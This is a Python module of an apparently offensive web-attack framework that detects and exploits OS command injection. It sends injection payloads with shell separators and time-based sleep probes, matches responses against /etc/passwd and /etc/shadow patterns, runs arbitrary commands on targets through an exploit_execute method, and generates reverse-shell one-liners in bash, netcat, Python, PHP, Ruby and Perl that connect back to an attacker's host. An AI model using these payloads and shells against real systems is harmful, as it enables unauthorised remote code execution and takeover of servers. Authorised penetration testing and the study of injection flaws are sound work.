#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Command Injection Module
OS Command Injection detection and exploitation
"""

import os
import sys
import re
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Payloads, Colors


class CommandInjectionModule:
    """Command Injection Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "Command Injection"
        
        # Command output indicators
        self.cmd_indicators = {
            'unix': [
                r'uid=\d+\(\w+\)\s+gid=\d+',
                r'root:x:\d+:\d+:',
                r'bin:x:\d+:\d+:',
                r'daemon:x:\d+:\d+:',
                r'Linux\s+\w+\s+\d+\.\d+',
                r' drwx',
                r'-rw-r--r--',
                r'lrwxrwxrwx',
                r'/bin/bash',
                r'/bin/sh',
                r'/etc/passwd',
                r'/etc/shadow',
            ],
            'windows': [
                r'Windows\s+\w+\s+\[Version\s+\d+\.\d+',
                r'Program Files',
                r'WINDOWS\\system32',
                r'Volume Serial Number',
                r'Directory of',
                r'\\Users\\',
                r'\\Windows\\',
                r'ADMINISTRATOR',
            ],
            'generic': [
                r'uid=\d+\s*\(\w+\)',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for Command Injection"""
        # Test basic command injection
        self._test_basic(url, method, param, value)
        
        # Test blind command injection (time-based)
        self._test_blind(url, method, param, value)
        
        # Test with different separators
        self._test_separators(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for Command Injection"""
        pass
    
    def _test_basic(self, url: str, method: str, param: str, value: str):
        """Test for basic command injection"""
        payloads = Payloads.CMDI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: f"{value}{payload}"}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check for command output indicators
                for os_type, indicators in self.cmd_indicators.items():
                    for indicator in indicators:
                        if re.search(indicator, response_text, re.IGNORECASE):
                            from core.engine import Finding
                            finding = Finding(
                                technique=f"Command Injection ({os_type.upper()})",
                                url=url,
                                severity='CRITICAL',
                                confidence=0.95,
                                param=param,
                                payload=payload,
                                evidence=f"Command output detected: {indicator[:50]}",
                            )
                            self.engine.add_finding(finding)
                            return
                            
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'CMDi test error: {e}')}")
    
    def _test_blind(self, url: str, method: str, param: str, value: str):
        """Test for blind command injection (time-based)"""
        blind_payloads = [
            '; sleep 5',
            '| sleep 5',
            '&& sleep 5',
            '|| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
            '| ping -n 5 127.0.0.1',
        ]
        
        # Measure baseline response time
        try:
            baseline_data = {param: value}
            baseline_start = time.time()
            self.requester.request(url, method, data=baseline_data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0
        
        for payload in blind_payloads:
            try:
                data = {param: f"{value}{payload}"}
                
                start_time = time.time()
                response = self.requester.request(url, method, data=data)
                elapsed = time.time() - start_time
                
                # Response must take significantly longer than baseline
                # and at least 4.8s (for sleep 5 payloads)
                if elapsed >= 4.8 and elapsed > baseline_time + 4.0:
                    from core.engine import Finding
                    finding = Finding(
                        technique="Command Injection (Blind/Time-based)",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Blind CMDi test error: {e}')}")
    
    def _test_separators(self, url: str, method: str, param: str, value: str):
        """Test various command separators"""
        separators = [
            (';', 'semicolon'),
            ('|', 'pipe'),
            ('||', 'or'),
            ('&', 'background'),
            ('&&', 'and'),
            ('`', 'backtick'),
            ('$', 'dollar'),
            ('\n', 'newline'),
            ('\r\n', 'crlf'),
            ('%0a', 'url_newline'),
            ('%3b', 'url_semicolon'),
        ]
        
        test_cmd = 'echo cmdi_test_12345'
        
        for sep, sep_name in separators:
            try:
                payload = f"{value}{sep}{test_cmd}"
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                if 'cmdi_test_12345' in response.text:
                    from core.engine import Finding
                    finding = Finding(
                        technique=f"Command Injection ({sep_name})",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.9,
                        param=param,
                        payload=payload,
                        evidence=f"Command separator '{sep}' works",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Separator test error: {e}')}")
    
    def exploit_execute(self, url: str, param: str, command: str, method: str = 'GET') -> str:
        """Execute command via RCE"""
        separators = [';', '|', '&&', '||', '`']
        
        for sep in separators:
            try:
                payload = f"{sep}{command}"
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if response:
                    return response.text
            except Exception as e:
                print(f"{Colors.error(f'Command execution error: {e}')}")
        
        return None
    
    def get_reverse_shell(self, url: str, param: str, host: str, port: int) -> str:
        """Generate reverse shell command"""
        shells = [
            f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            f"nc -e /bin/sh {host} {port}",
            f"nc -c bash {host} {port}",
            f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
            f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        ]
        
        return shells[0]  # Return bash reverse shell as default
